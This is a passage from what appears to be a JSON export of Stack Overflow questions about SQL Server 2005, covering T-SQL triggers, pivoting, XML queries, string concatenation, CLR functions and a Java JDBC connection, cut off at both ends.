trigger is as follows:</p>\n\n<pre><code>UPDATE BMS_Snapshot SET\n    NABERS = dbo.SetmetricsNABERSCalculation(\n        60,\n        tbl.NetFloorArea,\n        tbl.ElectricityCumulative,\n        tbl.GasCumulative,\n        tbl.ElectricityCumulativeMax,\n        tbl.GasCumulativeMax,\n        tbl.ElectricityMaxTotal,\n        tbl.GasMaxTotal,\n        tbl.NaturalGasConversionCubicMetersToMJ,\n        tbl.SuburbId)\nFROM\n    (SELECT \n        Snap.SnapshotId AS SnapshotId,\n        Snap.ElectricityCumulative AS ElectricityCumulative,\n        Snap.GasCumulative AS GasCumulative,\n        Building.NetFloorArea AS NetFloorArea, \n        Building.NABERSElecTotalMax AS ElectricityMaxTotal,\n        Building.NABERSGasTotalMax AS GasMaxTotal,\n        Building.NABERSExpiry As Expiry,\n        NABERSTarget.ElecCumulativeMax AS ElectricityCumulativeMax,\n        NABERSTarget.GasCumulativeMax AS GasCumulativeMax,\n        [State].NaturalGasConversionCubicMetersToMJ AS NaturalGasConversionCubicMetersToMJ,\n        Suburb.SuburbId AS SuburbId\n     FROM inserted AS Snap \n        INNER JOIN AST_Building AS Building ON Snap.BuildingId = Building.BuildingId\n        INNER JOIN ESD_Suburb AS Suburb ON Building.SuburbId = Suburb.SuburbId\n        INNER JOIN ESD_State AS [State] ON Suburb.StateId = [State].StateId\n        INNER JOIN AST_NABERSTarget NABERSTarget ON Snap.BuildingId = NABERSTarget.BuildingId AND\n            Snap.TimeStamp = NABERSTarget.Timestamp\n        /*Where Snap.SnapshotId IN (Select inserted.SnapshotId FROM inserted)*/) AS tbl\nWHERE tbl.SnapshotId = BMS_Snapshot.SnapshotId AND BMS_Snapshot.Range = 1\n</code></pre>\n\n<p>I've been playing around with it for a while, but can't seem to put my finger on the problem, particularly given it works sometimes.</p>\n"},{"tags":["sql","sql-server","xml","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2204,"score":3,"question_id":3070468,"title":"Bulk updating an sql server table using xml","body":"<p>How can i update bulk data in sql server 2005 by sending the data in XML form ?\ni am able to insert bulk data into the table, but i am not getting idea to update the data.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":10745422,"title":"Avoid duplicates in concatenated list","body":"<p>I have scenario where i want the invoice numbers from two tables in csv list. I could accomplish this using Stuff as below:</p>\n\n<pre><code>SELECT\n   sopnumbe\n  ,custname \n  ,Invoices = \n        STUFF((SELECT DISTINCT ', '+ RTRIM(a.sopnumbe)+', '+ RTRIM(B.sopnumbe)\n               FROM \n                  SOP10100  a\n                  fULL OUTER JOIN \n                  SOP30200 B\n                  ON a.ORIGNUMB =B.ORIGNUMB\n               WHERE a.ORIGNUMB =@ordernumb\n               FOR XML PATH('')) , 1 , 1 , '' )\nFROM SOP10100\nWHERE\n    SOPNUMBE = @ordernumb\n</code></pre>\n\n<p>The above query produces right results except for the repetitive invoice numbers in the list. Is there any other way to accomplish this?</p>\n\n<hr>\n\n<pre><code>if the result of simple outer join query is:\n\nINV1527157              INV1523836        \nINV1527157              INV1526475  \n</code></pre>\n\n<hr>\n\n<hr>\n\n<p>the result of stuff query:</p>\n\n<pre><code>K08081383206      BACHELOR CONTROLS INC    INV1527157, INV1523836, INV1527157, INV1526475\n</code></pre>\n\n<hr>\n\n<p>INV1527157 gets repeated, i want to get rid of repetition.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":158,"score":2,"question_id":10676308,"title":"group by records and then get last ascending sorted record from each group?","body":"<p>I have a table:</p>\n\n<pre><code>| P_id | Month |  Year  |  Name  |\n   624     09     2009    Test1\n   600     10     2010    Test2\n   624     10     2010    Test6\n   600     09     2011    Test7\n</code></pre>\n\n<ol>\n<li><p>I want to order my table by <code>P_id</code> descending, <code>Year</code> ascending, then <code>Month</code> ascending</p></li>\n<li><p>Based on the order I want the last record for each <code>P_id</code>. </p></li>\n</ol>\n\n<p>After step 1 is run:</p>\n\n<pre><code>| P_id | Month |  Year  |  Name  |\n  624     09      2009    Test1\n  624     10      2010    Test6\n  600     10      2010    Test2\n  600     09      2011    Test7\n</code></pre>\n\n<p>Desired Output:</p>\n\n<pre><code>| P_id | Month |  Year  |  Name  |\n   624     10     2010    Test6\n   600     09     2011    Test7\n</code></pre>\n"},{"tags":["c#","sql-server-2005","sql-server-2008","linq-to-entities"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":6768,"score":3,"question_id":3399061,"title":"Error - SqlDateTime overflow. Must be between 1/1/1753 12:00:00 AM and 12/31/9999 11:59:59 PM","body":"<p>i have an app written for 2008.</p>\n\n<p>We are using linq to entities.</p>\n\n<p>We've now had to switch the DB to 2005. I am getting the following error on linq SELECT queries:</p>\n\n<blockquote>\n  <p>Error - SqlDateTime overflow. Must be between 1/1/1753 12:00:00 AM and 12/31/9999 11:59:59 PM. </p>\n</blockquote>\n\n<p>The offending line is:</p>\n\n<pre><code>DateOfBirth = ((s.Date_Of_Birth == null) || (s.Date_Of_Birth &lt;= lowdate)) ?\n    DateTime.MinValue : s.Date_Of_Birth.Value,\n</code></pre>\n\n<p>DateOfBirth is of type DateTime and a property in our own business object (not entity).</p>\n\n<p>Anyone know how i can modify this line to make this query run? </p>\n"},{"tags":["sql","tsql","sql-server-2005","pivot-table"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":411,"score":1,"question_id":10741728,"title":"Pivot or Transpose SQL Server 2005 table data without row-by-row processing","body":"<p>Is it possible to do the following in SQL Server 2005 without row-by-row processing? If so, how? :)</p>\n\n<p>My table is like this:</p>\n\n<pre><code>\n CustomerID  FirstName   LastName  \n\n          1  George     Washington \n          2  Benjamin   Franklin   \n          3  Thomas     Jefferson  \n\n</code></pre>\n\n<p>I to output the above table like this:</p>\n\n<pre><code>\n   Field     IntValue  TextValue  \n\n CustomerID  1         NULL       \n FirstName   NULL      George     \n LastName    NULL      Washington \n CustomerID  2         NULL       \n FirstName   NULL      Benjamin   \n LastName    NULL      Franklin   \n CustomerID  3         NULL       \n FirstName   NULL      Thomas     \n LastName    NULL      Jefferson  \n\n</code></pre>\n\n<p>Thanks!\nJason</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":149,"score":4,"question_id":10739523,"title":"Inverted select TOP *","body":"<p>do you know when you have that huge log table and you just need to see the last X rows to know what is going on at the time?</p>\n\n<p>usually you can do:</p>\n\n<pre><code>select top 100 * \nfrom log_table\norder by ID desc\n</code></pre>\n\n<p>to show the 100 newest records, but it will do on the inverse order (of course, because of the order by DESC), for example:</p>\n\n<pre><code>100010\n100009\n100008\nand so on..\n</code></pre>\n\n<p>but for the sake of simplicity I would like to see the records on the order they happened.\nI can do that by running this query:</p>\n\n<pre><code>select * \nfrom(\n    select top 100 * from log_table order by ID desc\n    ) a\norder by a.id\n</code></pre>\n\n<p>where I get my top 100 order by ID desc and then invert the result set.\nIt works but it seems kin of unnecessary to run 2 select to produce this result. </p>\n\n<p>My question is: does anyone have a better idea of doing that? Like a select top on the end of the table?</p>\n\n<p>EDIT:\nexecution plan of both queries:\nIt seems like Alex's idea is very good but David was also right, there is only one select and one sort\n<img src=\"http://i.stack.imgur.com/qVZzg.jpg\" alt=\"enter image description here\"></p>\n\n<p>EDIT2:\nset statistics IO ON:</p>\n\n<pre><code>(10 row(s) affected)\nTable 'sysdtslog90'. Scan count 1, logical reads 3, physical reads 0, read-ahead reads 0, lob logical reads 12, lob physical reads 0, lob read-ahead reads 0.\n\n(1 row(s) affected)\n\n(10 row(s) affected)\nTable 'sysdtslog90'. Scan count 2, logical reads 5, physical reads 0, read-ahead reads 0, lob logical reads 12, lob physical reads 0, lob read-ahead reads 0.\n\n(1 row(s) affected)\n</code></pre>\n"},{"tags":[".net","sql-server-2005","sqlclr","server-farm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":124,"score":0,"question_id":9957457,"title":"SQL Server CLR integration in a server cluster/farm scenario","body":"<p>Is it a good-practice to enable SQL Server CLR integration in a server-cluster scenario? The policy at my organization disallows deploying CLR assemblies on their production servers; I was informed by the DBA's this is because the CLR UDFs runs in-process and the databases are on a cluster.</p>\n\n<p>I'm just curious if the policy is to simplify the DB admin (and perhaps ensure all code is open for review by DBA's), or <strong>is there a technical reason to prohibit CLR integration in a server-cluster scenario</strong>? Thread safety?</p>\n\n<p>Related questions: </p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/7595586/threading-in-clr-in-sql-server-2008\">Threading in CLR in SQL Server 2008</a></li>\n<li><a href=\"http://stackoverflow.com/questions/3414649/in-sql-server-is-clr-threadsafe\">IN SQL Server is CLR Threadsafe</a></li>\n<li><a href=\"http://stackoverflow.com/a/771740/1305138\">Why doesn't SQL Server come preinstalled with .net Framework for CLR Integration?</a></li>\n</ul>\n\n<p>(By the way, my primary use-case is for string-manipulation UDFs, as described in <a href=\"http://stackoverflow.com/a/1580051/1305138\">this answer</a>)</p>\n"},{"tags":["query","sql-server-2005","join"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":10427953,"title":"Grouping table rows and joining the results to another table","body":"<p>I have these three tables:</p>\n\n<p><strong>Table 1 :</strong></p>\n\n<pre><code>    InvoiceId         InvoiceNumber        CompanyId\n    -------------------------------------------------\n       3                   1                  2\n       4                   2                  2\n       6                   1                  1\n       7                   3                  2\n       8                   4                  2\n       9                   2                  1\n</code></pre>\n\n<p><strong>Table 2 :</strong></p>\n\n<pre><code>    CompanyId          CompanyName\n    -------------------------------\n       1                  Name1\n       2                  Name2\n</code></pre>\n\n<p><strong>Tabel 3 :</strong></p>\n\n<pre><code>    InvoiceId        AcceptDate       AcceptType\n    ---------------------------------------------\n       3                AAAA               O\n       3                BBBB               P\n       6                CCCC               P\n       4                DDDD               O\n       7                EEEE               O\n       9                FFFF               P\n       7                GGGG               P\n</code></pre>\n\n<p><em>Tables 1 and 3 have a one-to-many relationship, with Table 3 having the multiple linked rows. Table 3 will have a maximum of 2 rows per InvoiceId.</em></p>\n\n<p><strong>Task</strong></p>\n\n<p>I want to group Table 3 rows to give this result:</p>\n\n<pre><code>    InvoiceId       AcceptDate1      AcceptDate2\n    --------------------------------------------\n        3              AAAA             BBBB\n        6              CCCC             null\n        4              DDDD             null\n      and ....\n</code></pre>\n\n<p>And then join those results with Table 1 and Table 2 to give:</p>\n\n<pre><code>    InvoiceId     InvoiceNumber        AcceptDate1    AcceptDate2      Name\n    --------------------------------------------------------------------------\n       3               1                  AAAA           BBBB          Name2\n       4               2                  DDDD           null          Name2\n       7               3                  EEEE           GGGG          Name2\n       8               4                  null           null          Name2\n       6               1                  CCCC           null          Name1\n       9               2                  FFFF           null          Name1\n</code></pre>\n\n<p>AcceptDate1 and AcceptDate2 is static.</p>\n"},{"tags":["tsql","sql-server-2005","xml-namespaces"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":196,"score":1,"question_id":10737680,"title":"XML namespace in T-SQL","body":"<p>how would you write a t-sql query if the namespace is prefixed in all of the elements? I've tried many variations, and this is what I've got so far, but it just doesn't work...</p>\n\n<pre><code>DECLARE @x xml \nSET @x = (SELECT xml_data_column FROM dbo.Table\nWHERE xmlFileName = 'E:\\trnFile.xml'  )\n;WITH XMLNAMESPACES('http://schemas.xmlsoap.org/soap/envelope/' AS [soap]\n, 'tns:RetrievePurchaseResponse  xmlns:tns=\"urn:Transaction\"' AS tns) \nSELECT t.c.value('orderRef[1]', 'int') orderReference\n, t.c.value('orderNumber[1]', 'varchar(100)') orderNumber\n, t.c.value('subtotal[1]', 'varchar(100)') subtotal\nFROM  @x.nodes('/soap:Envelope/soap:Body/tns:RetrievePurchaseResponse/tns:purchase') AS t(c)\n</code></pre>\n\n<p>Assistance will be greatly appreciated ! </p>\n\n<p>Here is the XML input file: </p>\n\n<pre><code>&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n&lt;SOAP-ENV:Body&gt;\n&lt;tns:RetrievePurchaseResponse xmlns:tns=\"urn:Transaction\"&gt;\n  &lt;tns:purchase&gt;\n    &lt;tns:orderRef&gt;10027&lt;/tns:orderRef&gt;\n        &lt;tns:orderNumber&gt;425816&lt;/tns:orderNumber&gt;\n        &lt;tns:subtotal&gt;95.00&lt;/tns:subtotal&gt;\n&lt;/tns:purchase&gt;\n    &lt;/tns:RetrievePurchaseResponse&gt;\n&lt;/SOAP-ENV:Body&gt;\n&lt;/SOAP-ENV:Envelope&gt;\n</code></pre>\n\n<p>Expected output would be </p>\n\n<pre><code>orderReference,     orderNumber,    orderUserEmail\n10027,      425816,              user@domain.com\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":152,"score":0,"question_id":10704428,"title":"How to write a query using self join on a table with huge data?","body":"<p>with the following table structure:</p>\n\n<pre><code>table 1 : \"Customers\"\n\nCustID(primary key)  |  CustName(indexed)\n----------------------------------\nC1                       Cust1\nC2                       Cust2\n.                        Cust3\n.                        Cust.\n.                        Cust.\nC10000                   Cust10000\n\n\ntable 2 : \"CustomFields\"\n\nFieldID (primary key) |  ID (indexed)                | FieldValue\n---------------------------------------------------------------------\n1                        C1                              Test \n2                        C2                              Test \n3                        C3                              Test \n4                        C4                              Test \n.                        .                               Test \n.                        .                               Test \nfew millions             Z1                              Test   \n\n\"ID\" coulumn is indexed.\n</code></pre>\n\n<p>Trying to output the following;</p>\n\n<pre><code>CustID  |  Field 1  |  Field 2 | Field 3 | .... | Field N\n----------------------------------------------------------\n</code></pre>\n\n<p>I tried writing Query like</p>\n\n<pre><code>Select CustID, A1.FieldValue as [Field 1], A2.FieldValue as [Field 2]\n  from Customers \n\n    left outer join CustomFields A1\n    on\n      Customers.custID = A1.ID\n\n    left outer join CustomFields A2\n    on\n      Customers.custID = A2.ID\n\n    left outer join CustomFields An\n    on\n      Customers.custID = An.ID\n\n  where custName like 'C%'\n</code></pre>\n\n<p>Since the CustomFields table holds few million records, the above query does not perform good.  Now it takes about 10-12 seconds (for 500 customers and 6 Fields)</p>\n\n<p>I think the left outer joins are adding time here.  Any thoughts to solve the problem would be really helpful?</p>\n\n<p>Platform : SQL Server 2005</p>\n\n<p>Updated :</p>\n\n<p>CustomFields table is a generic table and it can contain fields of any other entities(vendors, items etc..).</p>\n"},{"tags":["sql","sql-server","database","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":622,"score":0,"question_id":10736261,"title":"What are candidate key, alternate key, composite key in sql?","body":"<p>what are <strong>candidate key</strong> , <strong>alternate key</strong> and <strong>composite key</strong><br>\n and why we use all of these </p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1216,"score":3,"question_id":732955,"title":"What privileges are required to store an SSIS package in SQL Server 2008","body":"<p>I want create SSIS package as a DB User.</p>\n\n<p>Also I want to store it to SQL Server not in file system. The DB user only have a db_owner privilege on a particular database.</p>\n\n<p>What least privileges are required to create SSIS.</p>\n\n<p>Already I have assigned the following</p>\n\n<p>grant execute on dbo.sp_ssis_checkexists to test\ngrant execute on dbo.sp_ssis_putpackage to test</p>\n\n<p>please provide feedback.</p>\n\n<p>thanks</p>\n"},{"tags":["c#","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":511,"score":0,"question_id":10616191,"title":"Create sql server functions from an assembly dll automatically","body":"<p>I have several functions in an assembly dll named <code>UserFunctions.dll</code>, for example :</p>\n\n<pre><code>public static partial class VariousFunctions\n{\n    [SqlFunction(IsDeterministic = true, IsPrecise = true)]\n    public static SqlBoolean RegexMatch(SqlString expression, SqlString pattern)\n    {\n      ...\n    }\n\n    [SqlFunction(IsDeterministic = true, IsPrecise = true)]\n    public static SqlInt32 WorkingDays(SqlDateTime startDateTime, SqlDateTime endDateTime)\n    {\n      ...\n    }\n\n    [SqlFunction(IsDeterministic = true, IsPrecise = true)]\n    public static SqlString getVersion()\n    {\n      ...\n    }\n\n    ...\n}\n</code></pre>\n\n<p>And I want to generate the sql script with a c# function, to create or update automatically all functions with attribute <code>SqlFunction</code> contained in this dll.\nThis sql script should look like this :</p>\n\n<pre><code>-- Delete all functions from assembly 'UserFunctions'\nDECLARE @sql NVARCHAR(MAX)\nSET @sql = 'DROP FUNCTION ' + STUFF(\n            (\n                SELECT\n                    ', ' + QUOTENAME(assembly_method) \n                FROM\n                    sys.assembly_modules\n                WHERE\n                    assembly_id IN (SELECT assembly_id FROM sys.assemblies WHERE name = 'UserFunctions')\n                FOR XML PATH('')\n            ), 1, 1, '')\n-- SELECT @sql\nIF @sql IS NOT NULL EXEC sp_executesql @sql\n\n\n-- Create all functions from assembly 'UserFunctions'\nCREATE FUNCTION RegexMatch(@expression NVARCHAR(MAX), @pattern NVARCHAR(MAX)) RETURNS BIT \n    AS EXTERNAL NAME UserFunctions.VariousFunctions.RegexMatch;\nGO\nCREATE FUNCTION WorkingDays(@startDateTime DATETIME, @endDateTime DATETIME) RETURNS INTEGER \n    AS EXTERNAL NAME UserFunctions.VariousFunctions.WorkingDays;\nGO  \n CREATE FUNCTION getVersion() RETURNS VARCHAR(MAX) \n    AS EXTERNAL NAME UserFunctions.VariousFunctions.getVersion;\nGO\n</code></pre>\n\n<p>The first part is very simple, but for the second part this is probably possible using the reflection methods of the classes Type, MethodInfo and ParameterInfo.\nSomeone has already done this ?</p>\n"},{"tags":["sql-server-2005","rdl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":10733482,"title":"RDL Table within a text box","body":"<p>I have one Parent table and two Child tables and the relationship is one to many.</p>\n\n<p>Is it possible to create a dynamic table inside a text box which can be created by the custom Code section (written in VB) in <code>RDL|PROPERTIES|CODE Tab</code>? I know the same can be achieved by sub-reports.</p>\n\n<p>I have an RDL which has a table that displays the Parent table's data and it's child data is displayed in columns of the same table. What I wanted, is to display the child data in a table within the table that displays parent table without using sub-reports.</p>\n\n<p>Because I return the multiple child data with the help of a function that brings all the data from the child table (comma-separated). So now if I could just generate a dynamic table by splitting this text, it would be really great.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","optimization","query-optimization"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":490,"score":2,"question_id":4515525,"title":"Optimizing a SQL expression generating Pareto's Points - How to efficiently group by each combination?","body":"<p>You don't really need to know here that it is generating Pareto's points; but we never know, maybe someone will say \"just use the hidden awesome built-in pareto function!\".</p>\n\n<h2>The problem</h2>\n\n<p>I have a query returning:</p>\n\n<pre><code>resource | activity_percentage\n1 | P(1)\n2 | P(2)\n3 | P(3)\n...\nN - 1 | P(N - 1)\nN | P(N)\n</code></pre>\n\n<p>Where:</p>\n\n<ul>\n<li>N is the total number of resources</li>\n<li>P is a function giving the activity percentage of a given resource; just to make it easier to read.</li>\n<li>P(1) >= P(2) >= .. >= P(N - 1) >= P(N); the resource 1 has the highest activity percentage, the resource N has the lowest, ...</li>\n</ul>\n\n<p>I need to group the resources one by one ({1}, {1; 2}, {1; 2; 3}, ...; {1; 2; ...; N}), accumulating the activity_percentage of the resources present in the group. The final result will be:</p>\n\n<pre><code>resource_percentage | activity_percentage\nR(1) | A(1)\nR(2) | A(2)\n...\nR(N - 1) | A(N - 1)\n</code></pre>\n\n<p>Where</p>\n\n<ul>\n<li>R(X) is the percentage of resources present in the the group number X. So R(X) = X/N. For example: Group 1 includes the resource 1; Group 2 includes 1 and 2; Group N includes the resources 1, 2, 3, 4, ..., N - 2, N - 1 and N. R(N) = 1</li>\n<li>A(X) is the accumulation of the percentages of each resource in the group. A(X) = P(1) + ... + P(X). For example: A(1) = P(1) since group 1 only includes 1; A(4) = P(1) + P(2) + P(3) + P(4) since group 4 includes 1, 2, 3 and 4.</li>\n</ul>\n\n<h2>My Solution</h2>\n\n<h2>1. Query to get a resource rank and its activity percentage</h2>\n\n<pre><code>-- Query assigning a number to each resource according to its rank of activity percentage.\nSELECT\n  row_number() OVER (ORDER BY activity_percentage DESC)  AS resource,\n  activity_percentage                                   AS activity_percentage\nFROM\n  Resource_Table\n</code></pre>\n\n<p>We obtain here:</p>\n\n<pre><code>resource | activity_percentage\n1 | P(1)\n2 | P(2)\n3 | P(3)\n...\nN - 1 | P(N - 1)\nN | P(N)\n</code></pre>\n\n<h2>2. Create a serie of number from 1 to N</h2>\n\n<p>Is there a SQL feature doing that? For now, I use the same query as above, which is bad and slow...</p>\n\n<pre><code>-- Creates a serie from 1 to the number of resources\nSELECT\n  row_number() OVER (ORDER BY activity_percentage DESC) AS i\nFROM\n  Resource_Table\n</code></pre>\n\n<p>We obtain:</p>\n\n<pre><code>i\n1\n2\n3\n...\nN\n</code></pre>\n\n<h2>3. Add the percentage of resources contained per group</h2>\n\n<p>To be able to say, for example, group 1 contains only 1 which represent (100 * 1/N) percent of resources; group N contains every resources; 100 * N / N = 100%</p>\n\n<pre><code>SELECT\n  i, -- i is the number of the group but it actually gives the number of resources it contains too\n  cast(i AS float) / resources.nb_resources AS resource_percentage\nFROM\n( -- Creates a number serie from 1 to the number of resources\n  SELECT\n    row_number() OVER (ORDER BY activity_percentage DESC)   AS i\n  FROM\n    Resource\n) groups\nJOIN\n( -- Query only getting the number of resources...\n  SELECT\n    count(DISTINCT resource_id) AS nb_resources\n  FROM\n    Resource_Table\n) customers ON 1 = 1\n</code></pre>\n\n<p>I hate this one since I am doing another query to get the number of resources, which is finally max(i) or the number of lines returned by the query (count(*))...</p>\n\n<h2>4. Group the resources together</h2>\n\n<p>So now, we just have to join these queries with the condition: resource &lt;= i</p>\n\n<pre><code>SELECT\n  groups.i                      AS group_number,\n  groups.resource_percentage,\n  activity_percentage.resource,\n  activity_percentage.activity_percentage  \nFROM\n(\n  SELECT\n    i, -- i is the number of the group but it actually gives the number of resources it contains too\n    cast(i AS float) / resources.nb_resources   AS resource_percentage\n  FROM\n  ( -- Creates a number serie from 1 to the number of resources\n    SELECT\n      row_number() OVER (ORDER BY activity_percentage DESC) AS i\n    FROM\n      Resource\n  ) groups\n  JOIN\n  ( -- Query only getting the number of resources...\n    SELECT\n      count(DISTINCT resource_id)   AS nb_resources\n    FROM\n      Resource_Table\n  ) customers ON 1 = 1\n) groups\nJOIN\n( -- Query assigning a number to every resource according to its activity percentage.\n  SELECT\n    row_number() OVER (ORDER BY activity_percentage DESC)  AS resource,\n    activity_percentage                                 AS activity_percentage\n  FROM\n    Resource_Table\n) activity_percentage ON activity_percentage.resource &lt;= groups.i\n</code></pre>\n\n<p>We obtain:</p>\n\n<pre><code>group_number | resource_percentage | resource | activity_percentage\n1 | R(1) | 1 | P(1)\n\n2 | R(2) | 1 | P(1)\n2 | R(2) | 2 | P(2)\n\n3 | R(3) | 1 | P(1)\n3 | R(3) | 2 | P(2)\n3 | R(3) | 3 | P(3)\n\n...\n\nN | R(N) | 1 | P(1)\nN | R(N) | 2 | P(2)\nN | R(N) | ... | ...\nN | R(N) | N | P(N)\n</code></pre>\n\n<h2>5. Simply aggregate per group_number</h2>\n\n<p>Changing the above query:</p>\n\n<pre><code>SELECT\n  groups.resource_percentage,\n  sum(activity_percentage.activity_percentage) AS activity_percentage\nFROM\n  ...\nGROUP BY\n  groups.resource_percentage\n</code></pre>\n\n<p>Grouping by the group_number or group_percentage does not matter since each group_number has a corresponding group_percentage.</p>\n\n<p>That's it! We obtain:</p>\n\n<pre><code>resource_percentage | activity_percentage\nR(1) | A(1) = P(1)\nR(2) | A(2) = P(1) + P(2)\n...\nR(N) | A(N) = P(1) + P(2) + ... + P(N)\n</code></pre>\n\n<p>Graphically:\n<img src=\"http://i.stack.imgur.com/tX3sy.png\" /></p>\n\n<h2>Conclusion</h2>\n\n<p>I obtain a very long query, mostly due to the creation of groups (my N is 25 550) but I would be very pleased to know a better solution, mostly for steps 2 &amp; 3.</p>\n\n<p>Thanks!!</p>\n"},{"tags":["sql","sql-server","oracle","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":5788808,"title":"how can I update the record in this case?","body":"<p>I am storing the various activities with id's as 1,2,3,4 consecutively.</p>\n\n<p>If I delete the 2nd record (id 2), how can I update so that 3 becomes 2 and 4 becomes 3? </p>\n\n<p>Thanks in advance </p>\n"},{"tags":["database","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1094,"score":3,"question_id":5512689,"title":"sp_prepare and sp_execute","body":"<p>I've been consulting google for some time now, but it hasn't been able to give me a satisfactory answer...</p>\n\n<p>In a SQL Server 2005 trace, I've got lots of \"exec sp_execute\" statements. I know they are connected to a corresponding \"exec sp_prepare\" statement which specifies the actual SQL.</p>\n\n<p>But...</p>\n\n<p><strong>One:</strong> Is it possible to find out the SQL behind the sp_execute without finding the sp_prepare?</p>\n\n<p><strong>Two:</strong> What type of construct would typically hide behind the sp_execute? That is, is it a stored procedure? Is it just a string in code? Or what?</p>\n\n<p><strong>Three:</strong> Should I fear bad performance seeing these in the trace?</p>\n\n<p>Any input is appreciated</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":348,"score":1,"question_id":1826273,"title":"Large table with no rows?","body":"<p>I have a Sql Server 2005 database that contains many tables which are taking up a large amount of space (combined over 10 GB), and these tables have no rows in them. I can see the space and row count with right-click, properties (Data space and row count items).</p>\n\n<p>Any ideas? </p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":227,"score":2,"question_id":10730177,"title":"SQL server join unrelated tables","body":"<p>I have two unrelaled table:</p>\n\n<p>PEOPLE table:</p>\n\n<pre><code>   ID | NAME | AGE\n    ------------\n   1  | DAVE | 43\n   1  | ANNE | 25\n   1  | MIKE | 58\n</code></pre>\n\n<p>PLACES table:</p>\n\n<pre><code>ID | COUNTRY | TOWN\n------------------\n1  |   USA    | WILMINGTON\n1  |   GER    | BERLIN\n1  |   POR    | LISBON\n1  |   JPN    | KYOTO\n</code></pre>\n\n<p>I want a Result like this:</p>\n\n<pre><code>NAME | AGE | COUNTRY | TOWN\n-----------------------------\nANNE |  25 | GER     | BERLIN\nDAVE |  43 | JPN     | KYOTO\nMIKE |  58 | POR     | LISBON\n           | USA     | WILMINGTON\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":654,"score":0,"question_id":10618912,"title":"LIKE using subquery returning multiple rows","body":"<p>There 2 tables emailinfo(id,email) and keywordinfo(id,keyword).\nemailinfo contains 80,000 rows and keywordinfo contains 2000 rows.</p>\n\n<p>I want emails from emailinfo table which does not contains keywords from keywordinfo table.</p>\n\n<p>I want not like condition on multiple rows</p>\n\n<p>I have kept all keywords in keywordinfo table</p>\n\n<p>Now I have to fetch all the emails from emailinfo table which not containing any keywords from keywordinfo table.</p>\n\n<p>I want query like following,</p>\n\n<pre><code>select email \nfrom emailinfo \nwhere email not like % (select keyword from keywordinfo)\n</code></pre>\n\n<p>I have tried following query</p>\n\n<pre><code>SELECT email \nFROM   emailinfo\n       join keywordinfo on email  like '%' + keyword +'%'**\n</code></pre>\n\n<p>but its not giving me proper results and is very slow.</p>\n"}]}
{"total":14387,"page":20,"pagesize":100,"questions":[{"tags":["java","sql-server-2005","jdbc","remote-server"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2569,"score":0,"question_id":3439671,"title":"Java DataBase Connectivity Problem with MS SQL Server 2005 from a Remote Server","body":"<p>I am writing a java code to connect with MS SQL Server 2005. MS SQL Server is on Remote server windows server 2003. I am trying the following code but i am unable to establish a connection:</p>\n\n<pre><code>import java.*;\n\npublic class Connect {\n     private java.sql.Connection con = null;\n     private final String url = \"jdbc:sqlserver://\";\n     private final String serverName=\"xxx.xxx.xxx.xxx\"; \n     private final String portNumber = \"1433\";\n     private final String databaseName=\"myDb\"; \n     private final String userName =\"user1\";\n     private final String password = \"xxxx\";     \n     private final String selectMethod = \"cursor\";\n\n     // Constructor\n     public Connect() {}\n\n     private String getConnectionUrl() {\n          return url+serverName+\":\"+portNumber+\";databaseName=\"+databaseName+\";selectMethod=\"+selectMethod+\";\";\n     }\n\n     private java.sql.Connection getConnection() {\n          try {\n              Class.forName(\"com.microsoft.sqlserver.jdbc.SQLServerDriver\");\n              con = java.sql.DriverManager.getConnection(getConnectionUrl(),userName,password);\n               if(con!=null) System.out.println(\"Connection Successful!\");\n          } catch(Exception e) {\n               e.printStackTrace();\n               System.out.println(\"Error Trace in getConnection() : \" + e.getMessage());\n         }\n          return con;\n      }\n\n     /*\n          Display the driver properties, database details\n     */\n\n     public void displayDbProperties() {\n                    System.out.println(\"Perform Operations \");\n\n     }\n\n     private void closeConnection() {\n          try{\n               if(con!=null)\n                    con.close();\n               con=null;\n          }catch(Exception e){\n               e.printStackTrace();\n          }\n     }\n     public static void main(String[] args) throws Exception {\n          Connect myDbTest = new Connect();\n         // 